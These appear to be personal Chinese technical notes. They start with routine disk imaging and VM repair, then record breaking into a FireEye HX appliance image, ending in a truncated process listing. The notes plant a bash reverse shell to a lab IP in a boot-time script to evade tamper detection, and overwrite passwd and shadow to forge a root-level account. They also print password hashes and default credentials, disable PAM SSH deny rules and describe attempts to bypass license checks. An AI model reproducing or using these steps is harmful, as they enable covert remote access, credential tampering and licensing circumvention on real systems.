# HDisk

### 磁盘备份

```
# Server A 接收
nc -l -p 9000 | dd of=/path/to/image.gz.base64

# Server B 发送
dd if=/dev/sda | gzip | base64 | nc 10.1.1.2 9000

# 系统还原
1.把 img raw 磁盘镜像文件，转换为vmdk
2.Vmware 添加硬盘 vmdk，BIOS启动从新硬盘启动。
3.报错无法启动 xfs_repair进行修复，猜测是系统运行中直接拷贝的原因。

# 参考：
# 备份/dev/hdx全盘数据，并利用gzip工具进行压缩，保存到指定路径：
https://major.io/2010/12/14/mounting-a-raw-partition-file-made-with-dd-or-dd_rescue-in-linux/
dd if=/dev/hdx | gzip >/path/to/image.gz
# 挂载raw
https://major.io/2010/12/14/mounting-a-raw-partition-file-made-with-dd-or-dd_rescue-in-linux/
http://www.voleg.info/linux-mirror-system-disk.html
```

### 磁盘读取

```
# Server A 接收
nc -l -v -p 9000 | dd of=/opt/dd/image.gz.base64

# Server B 发送
dd if=/dev/sda | gzip | base64 | nc 192.168.0.193 9000

## 解压
base64 -d image.gz.base64 > image.gz
gzip -d image.gz

## 挂载
# 查看分区
fdisk -l image
# 挂载
mount -o loop,offset=$((offset*512)) image /mnt/
mount -o loop,offset=$((4810752*512)) image /mnt/
```

### 仿真运行

```
qemu-system-x86_64 -drive format=raw,file=x86-64.img
emu-system-x86_64 -drive format=raw,file=x86-64.img
qemu-system-x86_64 -m 4096 -ctrl-grab -no-reboot x86-64.img
```

### 获取img信息

```
qemu-img.exe info d:\VM\Centos-img\img\CentOS7-img.img
image: d:\VM\Centos-img\img\CentOS7-img.img
file format: raw
virtual size: 20 GiB (21474836480 bytes)
disk size: 20 GiB
```

### 格式抓换 转换成vmdk

```
qemu-img convert -p -f raw -O vmdk d:\VM\Centos-img\img\CentOS7-img.img d:\VM\Centos-img\CentOS7.vmdk
-p标识转换的进度条。
-f后面为源镜像格式。
-O（必须是大写）后面的参数为转换出来的镜像格式 + 源镜像文件名称 + 目标文件名称。
// https://support.huaweicloud.com/bestpractice-ims/ims_bp_0030.html
```

### vm加载

### 修复报错

```
根据提示 确定报错 然后针对性修复
xfs_repair -v -L /dev/sda3
Reboot

ClockSource问题：
创建一个虚拟机。但发现无法启动，始终卡在“Switched to clocksource tsc”这个界面上：
最后发现，在选择虚拟磁盘类型时，不能选择默认的SCSI，选择IDE后，就能顺利启动了：

多块磁盘恢复，存在顺序和磁盘名问题。
fstab磁盘名称和挂载顺序问题
-修改/etc/fstab文件

CentOS启动出现Failed to start LSB: Bring up/down networking的解决方法
a start job is running for lsb
其中之一是禁用NetworkManager，我处理后网络恢复，执行命令：
systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl restart network

启动服务的依赖，可能导致无法启动
重点是 /etc/rc.d/ /usr/lib/systemd/
```

# FE镜像，运行恢复技术

```
FE镜像，运行恢复技术
admin 12345678
adm 12345678
ssh adm@192.168.88.130

####################################################################################
### 防篡改技术，修改启动文件，会被检测，禁止启动
### 触发防篡改的点（数千个监测点）
/opt/tms/bin/cli
/etc/httpd/conf.d/ssl.conf 
/etc/rc.local

### 绕过篡改检测
启动FE镜像，观测到一个报错丢失一个文件，该文件在启动过程中可以被执行
篡改静态磁盘/dev/sdc4，反弹shell脚本/etc/sysconfig/acpid
#ifconfig ether1 192.168.88.131 netmask 255.255.255.0
ifconfig ether2 192.168.88.130 netmask 255.255.255.0
ifconfig ether2 up
/sbin/ifconfig -a
/bin/bash -i >& /dev/tcp/192.168.88.129/8080 0>&1


####################################################################################
### 配置还原技术，修改shadow文件后，每次启动文件重新还原。
多次修改shadow，被坑了很久
mount -o remount,rw /
python3 -m http.server 8000
curl -o /tmp/s.txt 192.168.88.129/s.txt
cat /tmp/s.txt > /etc/shadow   
cat /tmp/p.txt > /etc/passwd

绕过配置还原技术，禁止修改文件
/var/opt/tms/output/* 动态生成的配置文件
chattr +i -i filename

文件passwd，修改用户的启动shell，也可以直接进入系统shell
admin:x:0:0:System Administrator:/var/home/root:/opt/tms/bin/cli
adm:x:0:0:System Administrator:/var/home/root:/bin/bash

文件shadow
admin:$6$IGuWZnR6$w9kaZLCQyOlLyrObLHlwjHE84U2tJhLk8k1RUAu1yzTrpH0o3xNv2uIZRpAJJh8MxoELW9YQCrapc4bWHeAOP0:10000:0:99999:7:::
_HX__alert-settings:$6$7pwTrDm9$TLhnb2ckv59.TAXotrzpE0eEny1Mnli45KyQo9ZNreTEDKHmOpVO7cZ3aX4j2P9kIvnKACSPSrRfMCAsewDQb0:10000:0:99999:7:::
_HX__module-admin:$6$GvcrBkOW$cexiXymCMoC14LNAcWRl4DLH2Q1cLbtjNfZRFEahXYEj973fQBj3RttmRM7kAWyMPtSp17vaTI8Gjjvpvf6sc.:10000:0:99999:7:::
_HX__triage-trigger:$6$cnKU06f1$8IelCh1gvhiL6OvC0GQvOrVPOmgW5fNOzFY/1cVu.iSt3v0NUm5bVxp0MQOwBJyA0pv1lkyMYKHyIZU4CYkZz.:10000:0:99999:7:::

伪造一个账户adm
adm:$6$IGuWZnR6$w9kaZLCQyOlLyrObLHlwjHE84U2tJhLk8k1RUAu1yzTrpH0o3xNv2uIZRpAJJh8MxoELW9YQCrapc4bWHeAOP0:10000:0:99999:7:::


####################################################################################
### 远程登录限制技术，无法登录进去
### sshd拦截，通过修改以下配置，成功登录。
/etc/pam.d/sshd
#%PAM-1.0
auth       include      system-auth
#account    required     pam_listfile.so item=user sense=deny file=/var/opt/tms/output/ssh.deny onerr=succeed
account    include      system-auth
#account    required     pam_nologin.so
#account    required     pam_disabled.so
password   include      system-auth
session    optional     pam_keyinit.so force revoke
session    include      system-auth
session    required     pam_loginuid.so


####################################################################################
### WebUI默认没有启动，手动运行Apache
### 手动启动Apache，报错没有证书信息，手动生成证书并修改配置文件
/etc/httpd/conf.d/ssl.conf 
SSLEngine on
SSLCertificateFile /etc/httpd/ml/server.crt
SSLCertificateKeyFile /etc/httpd/ml/server.key
	生成证书
	#建立服务器密钥  
	openssl genrsa -des3 1024  > ./server.key   
	# 从密钥中删除密码（以避免系统启动后被询问口令） 
	openssl rsa -in ./server.key > ./server2.key
	mv ./server2.key  ./server.key
	#建立服务器密钥请求文件
	openssl req -new -key ./server.key -out ./server.csr
	# 建立服务器证书  
	openssl x509 -in ./server.csr -out ./server.crt -req -signkey ./server.key -days 365
启动httpd服务
/usr/sbin/httpd -k start
查看日志 /var/log/apache*.log


####################################################################################
### 重置admin密码后，才能激活admin账号
首先进入配置模式
> enble
> configure terminal
> 键盘TAB TAB 看到一些列命令
> username admin password 修改密码


####################################################################################
### 许可证问题，！下一步准备测试修改源码
## 重置密码后 可以登录web界面，没有许可进不去
## 说明文档中看到一个许可格式：
LK2-FIREEYE_APPLIANCE-0000-0000-0000-0000-0000-0000-0000-0000-0000-0000
LK2-HX-ADVANCED-0000-0000-0000-0000-0000-0000-0000-0000-0000-0000
date -s 06/06/2015 修改系统日期，许可无效

# rails web源码提取
/opt/tms/lib/web/rails/fireeye_ng



####################################################################################
### 挂载磁盘，查看静态文件信息
$ fdisk -l
Disk /dev/sdc: 512 GiB, 549755813888 bytes, 1073741824 sectors
Disk model: VMware Virtual S
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 3F8F453D-59C1-4159-9020-B43456D36907
Device         Start        End   Sectors   Size Type
/dev/sdc1       2048     262016    259969   127M EFI System
/dev/sdc2     262144     524160    262017   128M Microsoft basic data
/dev/sdc3     524288     786304    262017   128M Microsoft basic data
/dev/sdc4     786432    9174912   8388481     4G Microsoft basic data
/dev/sdc5    9175040   17563520   8388481     4G Microsoft basic data x
/dev/sdc6   17563648   51117952  33554305    16G Linux swap
/dev/sdc7   51118080   52166528   1048449   512M Microsoft basic data
/dev/sdc8   52166656   94109568  41942913    20G Microsoft basic data
/dev/sdc9   94109696  228327296 134217601    64G Microsoft basic data
/dev/sdc10 228327424  232521600   4194177     2G Microsoft basic data
/dev/sdc11 232521728 1073741790 841220063 401.1G Microsoft basic data

$ mount /dev/sdc5 5
$ cat 5/etc/fstab
LABEL=ROOT_2	/	ext4	defaults,noatime,ro	1 1                            5 
LABEL=BOOT_2	/boot	ext4	defaults,noatime,ro,noexec	1 2
LABEL=BOOTMGR	/bootmgr	ext4	defaults,noatime,ro,noexec	1 2
LABEL=CONFIG	/config	ext4	defaults,noatime,noexec	1 2
LABEL=VAR	/var	ext4	defaults,noatime	1 2                                      8
LABEL=TOOLS	/tools	ext4	defaults,noatime,ro,noexec	1 2
LABEL=DATA	/data	ext4	defaults,noatime	1 2                                       11
LABEL=DB	/data/db	ext4	defaults,noatime,barrier=0	1 2                              9
LABEL=SWAP_1	swap	swap	defaults,noatime	0 0
tmpfs           /dev/shm        tmpfs   defaults        0 0
devpts          /dev/pts        devpts  gid=5,mode=620  0 0
sysfs           /sys            sysfs   defaults        0 0
proc            /proc           proc    defaults        0 0
/dev/cdrom      /mnt/cdrom      iso9660 noauto,ro       0 0
/dev/fd0        /mnt/floppy     auto    noauto          0 0

# 其他信息
root@sysadmin-virtual-machine:/mnt/fe/10/mfg# 疑似密钥
image.img  initrd.img  options.txt  vmlinuz
root@sysadmin-virtual-machine:/mnt/fe/10/mfg# cat options.txt 
xopt_mfg_m=FireEyeHX1550V
xopt_mfg_h=65cfd813c41d

root@sysadmin-virtual-machine:/mnt/fe/9/fireeye# 数据库磁盘
base           pg_logical    pg_stat      pg_wal                server.crt
global         pg_multixact  pg_stat_tmp  pg_xact               server.key
pg_commit_ts   pg_notify     pg_subtrans  postgresql.auto.conf
pg_dynshmem    pg_replslot   pg_tblspc    postgresql.conf
pg_hba.conf    pg_serial     pg_twophase  postmaster.opts
pg_ident.conf  pg_snapshots  PG_VERSION   postmaster.pid

# 进程信息
$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
admin        1  0.2  0.0  19528  2556 ?        Ss   04:16   0:00 /sbin/init
admin        2  0.0  0.0      0     0 ?        S    04:16   0:00 [kthreadd]
admin        3  0.0  0.0      0     0 ?        I<   04:16   0:00 [rcu_gp]
admin        4  0.0  0.0      0     0 ?        I<   04:16   0:00 [rcu_par_gp]
admin        6  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/0:0H-kb]
admin        8  0.0  0.0      0     0 ?        I<   04:16   0:00 [mm_percpu_wq]
admin        9  0.0  0.0      0     0 ?        S    04:16   0:00 [ksoftirqd/0]
admin       10  0.2  0.0      0     0 ?        I    04:16   0:01 [rcu_preempt]
admin       11  0.0  0.0      0     0 ?        I    04:16   0:00 [rcu_sched]
admin       12  0.0  0.0      0     0 ?        I    04:16   0:00 [rcu_bh]
admin       13  0.0  0.0      0     0 ?        S    04:16   0:00 [migration/0]
admin       14  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/0:1-rcu]
admin       15  0.0  0.0      0     0 ?        S    04:16   0:00 [cpuhp/0]
admin       16  0.0  0.0      0     0 ?        S    04:16   0:00 [cpuhp/1]
admin       17  0.0  0.0      0     0 ?        S    04:16   0:00 [migration/1]
admin       18  0.0  0.0      0     0 ?        S    04:16   0:00 [ksoftirqd/1]
admin       20  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/1:0H-kb]
admin       21  0.0  0.0      0     0 ?        S    04:16   0:00 [cpuhp/2]
admin       22  0.0  0.0      0     0 ?        S    04:16   0:00 [migration/2]
admin       23  0.0  0.0      0     0 ?        S    04:16   0:00 [ksoftirqd/2]
admin       25  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/2:0H-kb]
admin       26  0.0  0.0      0     0 ?        S    04:16   0:00 [cpuhp/3]
admin       27  0.0  0.0      0     0 ?        S    04:16   0:00 [migration/3]
admin       28  0.0  0.0      0     0 ?        S    04:16   0:00 [ksoftirqd/3]
admin       30  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/3:0H-kb]
admin       31  0.0  0.0      0     0 ?        S    04:16   0:00 [kdevtmpfs]
admin       32  0.0  0.0      0     0 ?        I<   04:16   0:00 [netns]
admin       34  0.0  0.0      0     0 ?        S    04:16   0:00 [rcu_tasks_kthre]
admin       36  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/3:1-eve]
admin       38  0.0  0.0      0     0 ?        S    04:16   0:00 [kauditd]
admin       41  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/1:1]
admin      359  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/0:2-mm_]
admin      365  0.0  0.0      0     0 ?        S    04:16   0:00 [oom_reaper]
admin      366  0.0  0.0      0     0 ?        I<   04:16   0:00 [writeback]
admin      368  0.0  0.0      0     0 ?        S    04:16   0:00 [kcompactd0]
admin      369  0.0  0.0      0     0 ?        I<   04:16   0:00 [crypto]
admin      370  0.0  0.0      0     0 ?        I<   04:16   0:00 [kintegrityd]
admin      372  0.0  0.0      0     0 ?        I<   04:16   0:00 [kblockd]
admin      373  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/2:1-mm_]
admin      939  0.0  0.0      0     0 ?        I<   04:16   0:00 [ata_sff]
admin      958  0.0  0.0      0     0 ?        I<   04:16   0:00 [md]
admin     1149  0.0  0.0      0     0 ?        S    04:16   0:00 [kswapd0]
admin     1234  0.0  0.0      0     0 ?        I<   04:16   0:00 [acpi_thermal_pm]
admin     1331  0.0  0.0      0     0 ?        I<   04:16   0:00 [iscsi_eh]
admin     1355  0.0  0.0      0     0 ?        S    04:16   0:00 [scsi_eh_0]
admin     1356  0.0  0.0      0     0 ?        I<   04:16   0:00 [scsi_tmf_0]
admin     1357  0.0  0.0      0     0 ?        I<   04:16   0:00 [vmw_pvscsi_wq_0]
admin     1373  0.0  0.0      0     0 ?        I<   04:16   0:00 [nvme-wq]
admin     1374  0.0  0.0      0     0 ?        I<   04:16   0:00 [nvme-reset-wq]
admin     1377  0.0  0.0      0     0 ?        I<   04:16   0:00 [nvme-delete-wq]
admin     1483  0.0  0.0      0     0 ?        S    04:16   0:00 [scsi_eh_1]
admin     1611  0.0  0.0      0     0 ?        I<   04:16   0:00 [ena]
admin     1613  0.0  0.0      0     0 ?        I<   04:16   0:00 [ixgbe]
admin     1615  0.0  0.0      0     0 ?        I<   04:16   0:00 [ixgbevf]
admin     1616  0.0  0.0      0     0 ?        I<   04:16   0:00 [i40e]
admin     1638  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/u128:30]
admin     1639  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/u128:31]
admin     1734  0.0  0.0      0     0 ?        I<   04:16   0:00 [raid5wq]
admin     1739  0.0  0.0      0     0 ?        I<   04:16   0:00 [ipv6_addrconf]
admin     1760  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/2:2-ata]
admin     1765  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda5-8]
admin     1766  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     1823  0.0  0.0  15920  2192 ?        S<s  04:16   0:00 /sbin/udevd -d --resolve-names=never
admin     2030  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/3:2]
admin     2150  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/1:2-eve]
admin     2205  0.0  0.0  15916  2016 ?        S<   04:16   0:00 /sbin/udevd -d --resolve-names=never
admin     2208  0.0  0.0  15916  2016 ?        S<   04:16   0:00 /sbin/udevd -d --resolve-names=never
admin     2234  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/1:1H-kb]
admin     2236  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/3:1H-kb]
admin     2266  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda3-8]
admin     2267  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2268  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda1-8]
admin     2269  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2270  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda7-8]
admin     2271  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2272  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda8-8]
admin     2273  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2274  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda10-8]
admin     2275  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2276  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda11-8]
admin     2277  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2278  0.0  0.0      0     0 ?        S    04:16   0:00 [jbd2/sda9-8]
admin     2279  0.0  0.0      0     0 ?        I<   04:16   0:00 [ext4-rsv-conver]
admin     2468  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/0:1H-kb]
admin     2469  0.0  0.0      0     0 ?        I<   04:16   0:00 [kworker/2:1H-kb]
admin     2999  0.0  0.0   6532  1244 ?        Ss   04:17   0:00 /usr/sbin/mcelog --config-file /etc/mcelog/mcelog.conf --daemon
admin     5395  0.0  0.0   4344  1340 ?        Ss   04:19   0:00 /usr/sbin/acpid
admin     5427  0.2  0.1 105132  6352 ?        S<s  04:19   0:00 /opt/tms/bin/pm
postgres  5428  0.0  1.0 630360 40612 ?        S<s  04:19   0:00 /usr/postgresql/bin/postmaster -D /data/db/fireeye
admin     5429  6.9  1.7 385320 69032 ?        S<s  04:19   0:15 /opt/tms/bin/mgmtd
postgres  5433  0.0  0.0 630360  3544 ?        S<s  04:19   0:00 postgres: checkpointer process   
postgres  5434  0.0  0.1 630360  6392 ?        S<s  04:19   0:00 postgres: writer process   
postgres  5435  0.0  0.5 630360 20956 ?        S<s  04:19   0:00 postgres: wal writer process   
postgres  5436  0.0  0.1 630784  6856 ?        S<s  04:19   0:00 postgres: autovacuum launcher process   
postgres  5437  0.0  0.1  66560  4044 ?        S<s  04:19   0:00 postgres: stats collector process   
postgres  5438  0.0  0.1 630668  4268 ?        S<s  04:19   0:00 postgres: bgworker: logical replication launcher   
admin     5736  0.0  0.0      0     0 ?        S<   04:19   0:00 [loop5]
admin     5741  0.0  0.0      0     0 ?        I<   04:19   0:00 [kdmflush]
admin     5742  0.0  0.0      0     0 ?        I<   04:19   0:00 [kcryptd_io]
admin     5743  0.0  0.0      0     0 ?        I<   04:19   0:00 [kworker/u129:0-]
admin     5744  0.0  0.0      0     0 ?        I<   04:19   0:00 [kcryptd]
admin     5745  0.0  0.0      0     0 ?        S    04:19   0:00 [dmcrypt_write]
admin     5748  0.0  0.0      0     0 ?        I<   04:19   0:00 [kworker/u129:1-]
admin     5754  0.0  0.0      0     0 ?        I<   04:19   0:00 [kworker/u129:2-]
admin     5755  0.0  0.0      0     0 ?        I<   04:19   0:00 [kworker/u129:3-]
admin     5756  0.0  0.0      0     0 ?        S    04:19   0:00 [jbd2/dm-0-8]
admin     5757  0.0  0.0      0     0 ?        I<   04:19   0:00 [ext4-rsv-conver]
admin     5760  0.0  0.0      0     0 ?        I<   04:19   0:00 [kworker/u129:4-]
admin     6689  0.2  0.0 251732  2660 ?        S<sl 04:19   0:00 /sbin/rsyslogd
entropy+  6866  0.0  0.1 114508  5616 ?        Ss   04:19   0:00 /opt/tms/bin/entropy_client
admin     6867  0.1  0.1 116268  6768 ?        Ss   04:19   0:00 /opt/tms/bin/statsd
admin     6868  0.0  0.1 111856  4832 ?        S    04:19   0:00 /opt/tms/bin/entropy_client 4
admin     6997  0.0  0.0  14784  2580 ?        Ss   04:19   0:00 /usr/sbin/crond -n
admin     6998  2.4  0.7 10611176 30420 ?      Ssl  04:19   0:05 /opt/fireeye/bin/etcd
femex     6999  0.0  0.1 269708  5396 ?        Ssl  04:19   0:00 /opt/fireeye/femex/bin/femexd
admin     7001  0.0  0.0  12636  2408 ?        Ss   04:19   0:00 /sbin/rngstart -w 3072 -F 1
ntp       7006  0.0  0.1  29424  4756 ?        Ss   04:19   0:00 /usr/sbin/ntpd -n -u ntp -g -U 60
redis     7010  0.1  0.1  39328  4004 ?        Ssl  04:19   0:00 /usr/bin/redis-server 127.0.0.1:5800
cmcrendv  7016  0.0  0.1  99352  3896 ?        Ss   04:19   0:00 /opt/tms/bin/rendv_client
admin     7018  0.2  0.6 265216 26000 ?        Ss   04:19   0:00 /opt/tms/bin/sched
admin     7021  0.0  0.0  29424  2544 ?        S    04:19   0:00 /usr/sbin/ntpd -n -u ntp -g -U 60
admin     7025  0.0  0.0   4320  1468 ?        S    04:19   0:00 /usr/bin/logger -t etcd
admin     7026  0.0  0.3 119864 11776 ?        Ss   04:19   0:00 /opt/tms/bin/snmpd -f -Ls7 -c /etc/snmpd.conf
updatem+  7032  0.0  0.1 100144  4100 ?        Ss   04:19   0:00 /opt/tms/bin/updatemgrd
admin     7038  0.2  0.1 110968  6588 ?        Ss   04:19   0:00 /opt/tms/bin/wsmd
hxmsgbus  7040  1.4  1.6 4300424 63020 ?       Ssl  04:19   0:03 java -Xmx1G -Xms256m -server -XX:+UseG1GC -XX:MaxGCPauseMillis=20 -XX:InitiatingHeapOccupancyPercent=35 -XX:+ExplicitGCInvokesConcurrent -Djava.awt.headless=true -Xloggc:/data/mb/zookeeper/zookeeper-gc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dkafka.logs.dir=/data/mb/zookeeper -Dlog4j.configuration=file:/opt/fireeye/share/messageBus/etc/mb_zookeeper_log4j.properties -cp /opt/fireeye/lib/messageBus/jar/kafka/*:/opt/fireeye/lib/messageBus/jar/messagebus.jar:/opt/fireeye/lib/messageBus/jar/kafka/aopalliance-repackaged-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/audience-annotations-0.5.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/commons-cli-1.2.jar:/opt/fireeye/lib/messageBus/jar/kafka/grizzly-framework-2.3.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/grizzly-http-2.3.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/grizzly-http-server-2.3.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/hk2-api-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/hk2-locator-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/hk2-utils-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-annotations-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-core-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-databind-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-dataformat-csv-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-datatype-jdk8-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-module-paranamer-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-module-scala_2.12-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/javassist-3.18.1-GA.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.annotation-api-1.2.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.inject-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.json-1.0.4.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.ws.rs-api-2.0.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-client-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-common-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-container-grizzly2-http-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-guava-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-media-jaxb-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-media-json-processing-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-media-multipart-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-server-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jopt-simple-5.0.4.jar:/opt/fireeye/lib/messageBus/jar/kafka/jsonp-jaxrs-1.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jsr305-3.0.2.jar:/opt/fireeye/lib/messageBus/jar/kafka/junit-3.8.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/kafka-clients-2.3.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/kafka_2.12-2.3.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/log4j-1.2.16.jar:/opt/fireeye/lib/messageBus/jar/kafka/lz4-java-1.6.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/metrics-core-2.2.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/mimepull-1.9.5.jar:/opt/fireeye/lib/messageBus/jar/kafka/osgi-resource-locator-1.0.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/paranamer-2.8.jar:/opt/fireeye/lib/messageBus/jar/kafka/scala-library-2.12.8.jar:/opt/fireeye/lib/messageBus/jar/kafka/scala-logging_2.12-3.9.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/scala-reflect-2.12.8.jar:/opt/fireeye/lib/messageBus/jar/kafka/slf4j-api-1.7.26.jar:/opt/fireeye/lib/messageBus/jar/kafka/spotbugs-annotations-3.1.9.jar:/opt/fireeye/lib/messageBus/jar/kafka/validation-api-1.1.0.Final.jar:/opt/fireeye/lib/messageBus/jar/kafka/zkclient-0.11.jar:/opt/fireeye/lib/messageBus/jar/kafka/zookeeper-3.4.14.jar -Djava.net.preferIPv4Stack=true org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/fireeye/share/messageBus/etc/mb_zookeeper.properties
hxmsgbus  7049  0.0  0.0   4320  1300 ?        S    04:19   0:00 /usr/bin/logger -t zookeeper
admin     7057  0.4  0.1  12148  4784 ?        S    04:19   0:00 /sbin/haveged -w 3072 -F
admin     7334  0.0  0.1  47100  5508 ?        Ss   04:19   0:00 /usr/sbin/sshd -D
admin     7637  0.1  0.0   6460  1568 ttyS1    Ss+  04:19   0:00 /sbin/agetty ttyS1 115200 vt102
admin     7638  0.0  0.0   6460  1664 ttyS0    Ss+  04:19   0:00 /sbin/agetty ttyS0 115200 vt102
admin     7641  0.0  0.1 102588  7188 ?        Ss   04:19   0:00 login -- admin
admin     7643  0.0  0.0   4312  1380 tty2     Ss+  04:19   0:00 /sbin/mingetty /dev/tty2
admin     7645  0.0  0.0   4312  1380 tty3     Ss+  04:19   0:00 /sbin/mingetty /dev/tty3
admin     7647  0.0  0.0   4312  1332 tty4     Ss+  04:19   0:00 /sbin/mingetty /dev/tty4
admin     7649  0.0  0.0   4312  1340 tty5     Ss+  04:19   0:00 /sbin/mingetty /dev/tty5
admin     7651  0.0  0.0   4312  1396 tty6     Ss+  04:19   0:00 /sbin/mingetty /dev/tty6
admin     7898  0.0  0.0  16172  3148 tty1     Ss   04:20   0:00 -cli
sfserver  8009  0.2  0.2 1332964 8464 ?        Ssl  04:20   0:00 /opt/fireeye/bin/ktserver -host 127.0.0.1 -port 1978 -scr /opt/fireeye/share/sfserver/scripts/kyoto_script.lua -pid /var/run/kyoto.pid -ls /data/sf/casket.kct#msiz=118m#pccap=1g#bnum=1180000#opts=li#ktopts=p#dfunit=8
admin     8360  1.1  1.4 262988 54336 ?        Ssl  04:20   0:01 /usr/bin/python3.6 /opt/fireeye/api_manager/main.py --mode prod
hxmsgbus  8361 13.1  8.5 8177828 329464 ?      Ssl  04:20   0:21 java -Xmx4G -Xms256m -server -XX:+UseG1GC -XX:MaxGCPauseMillis=20 -XX:InitiatingHeapOccupancyPercent=35 -XX:+ExplicitGCInvokesConcurrent -Djava.awt.headless=true -Xloggc:/data/mb/kafka-logs/kafkaServer-gc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dkafka.logs.dir=/data/mb/kafka-logs -Dlog4j.configuration=file:/opt/fireeye/share/messageBus/etc/mb_kafka_server_log4j.properties -cp /opt/fireeye/lib/messageBus/jar/kafka/*:/opt/fireeye/lib/messageBus/jar/messagebus.jar:/opt/fireeye/lib/messageBus/jar/kafka/aopalliance-repackaged-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/audience-annotations-0.5.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/commons-cli-1.2.jar:/opt/fireeye/lib/messageBus/jar/kafka/grizzly-framework-2.3.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/grizzly-http-2.3.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/grizzly-http-server-2.3.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/hk2-api-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/hk2-locator-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/hk2-utils-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-annotations-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-core-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-databind-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-dataformat-csv-2.10.0.jar:/op